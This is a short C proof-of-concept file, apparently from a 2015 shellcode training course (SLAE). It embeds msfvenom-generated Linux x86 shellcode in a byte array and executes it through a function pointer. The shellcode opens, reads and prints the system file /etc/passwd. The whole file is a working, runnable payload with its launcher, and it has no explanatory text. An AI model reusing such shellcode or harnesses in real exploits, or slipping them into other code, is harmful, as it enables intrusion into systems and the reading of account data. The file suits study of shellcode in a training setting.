/*
 * Title: msfvenom - read_file "/etc/passwd"  PoC
 * Platform: linux/x86
 * Date: 2015-01-13
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
 */
#include <stdio.h>

unsigned char shellcode[] =
	"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
	"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
	"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
	"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
	"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";

void
main(void)
{
	int (*ret)() = (int(*)())shellcode;
	ret();
}